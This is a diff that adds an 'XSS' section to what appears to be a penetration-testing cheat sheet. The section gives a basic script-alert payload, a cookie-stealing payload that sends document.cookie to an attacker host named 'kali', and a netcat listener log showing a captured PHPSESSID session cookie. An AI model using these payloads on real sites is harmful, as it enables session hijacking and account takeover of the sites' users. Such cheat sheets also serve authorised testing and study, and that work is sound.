@@ -691,3 +691,28 @@ dir /s
 ### SSH-keys
 
 ## How to replicate:
+
+
+## XSS
+
+
+```
+<script>alert("XSS")</script>
+
+<script>
+new Image().src="http://kali/bogus.php?output="+document.cookie;
+</script>
+
+root@kali:~# nc -nlvp 80
+listening on [any] 80 ...
+connect to [kali] from (UNKNOWN) [target] 49455
+GET /bogus.php?output=PHPSESSID=CREDS HTTP/1.1
+Accept: */*
+Referer: http://127.0.0.1/index.php
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;
+.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+Accept-Encoding: gzip, deflate
+Host: 192.168.10.5
+Connection: Keep-Alive
+```
